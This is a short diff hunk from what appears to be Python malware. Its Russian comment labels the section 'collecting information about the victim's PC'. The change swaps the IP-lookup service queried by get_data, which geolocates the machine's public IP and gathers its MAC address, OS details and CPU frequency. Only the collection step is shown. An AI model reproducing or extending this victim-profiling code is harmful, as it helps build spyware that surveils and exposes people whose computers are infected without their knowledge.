@@ -21,7 +21,7 @@ import psutil
 #                      Сбор информации о ПК жертвы                      #
 #########################################################################
 def get_data():
-    response = DbIpCity.get(requests.get("https://ip.beget.ru").text, api_key = "free") 
+    response = DbIpCity.get(requests.get("https://ramziv.com/ip").text, api_key = "free") 
     mac_address = get_mac() # получаем Mac-адрес компьютера
     op = platform.uname() # имя операционной системы 
     cpu = psutil.cpu_freq() # частота процессора 
